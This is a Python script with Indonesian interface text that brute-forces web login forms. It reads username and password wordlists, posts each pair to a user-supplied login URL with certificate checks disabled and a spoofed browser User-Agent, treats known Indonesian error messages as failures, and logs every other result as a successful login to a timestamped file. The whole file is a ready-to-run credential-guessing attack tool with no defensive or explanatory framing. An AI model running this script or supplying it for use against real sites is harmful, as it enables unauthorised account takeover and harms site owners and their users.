import os
import time
import requests
import urllib3
import datetime
from colorama import Fore, Back, Style, init

init()


Tanggal = datetime.datetime.now()
file_name = Tanggal.strftime("%d%b%Y_%H%M%S")   
def bruteV1():
    link_target = input(str(Fore.YELLOW + "Masukan Link Target Form Login : "+ Style.RESET_ALL))
    Parameter1 = input(str(Fore.YELLOW +"Masukan Parameter user           : "+ Style.RESET_ALL))
    Parameter2 = input(str(Fore.YELLOW +"Masukan Parameter pass           : "+ Style.RESET_ALL))
    path1 = input(str(Fore.YELLOW +"Masukan Path Wordlist Username        : "+ Style.RESET_ALL))
    path2 = input(str(Fore.YELLOW +"Masukan Path Wordlist Password        : "+ Style.RESET_ALL))
    print("\n########### Login Mass Berjalan ###########" , Style.RESET_ALL)
    print("\n")
    with open ('./'+path1, "r") as myFile1:
        data = myFile1.readlines()
    with open ('./'+path2, "r") as MyFile2:
        data2 = MyFile2.readlines()

    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }

    for i in range(0,len(data)):
        u = data[i].rstrip('\n')
        p = data2[i].rstrip('\n')
        try:
            urllib3.disable_warnings()
            data_dict = {Parameter1:u,Parameter2:p}
            req = requests.post(link_target, verify = False,headers = headers, data=data_dict )
            if('Username tidak ditemukan' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
                print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,p,Fore.RED + "Login Gagal" + Style.RESET_ALL)
            else:
                print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ",Style.RESET_ALL,p, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL)
                link = req.url
                simpan_log = "Username {} Password {} Website {}\n".format(u,p,link)
                log = open("././log/bruteV1/{}.txt".format(file_name),'a')
                log.write(str(simpan_log))
        except requests.exceptions.RequestException as e:
            print(e)
    print(Fore.YELLOW +  "\n#############################################")
    print("Login Masal Selesai")
    print("Log Tersimpan Pada Folder log Dengan Nama {}.txt".format(file_name+ Style.RESET_ALL),Fore.RED)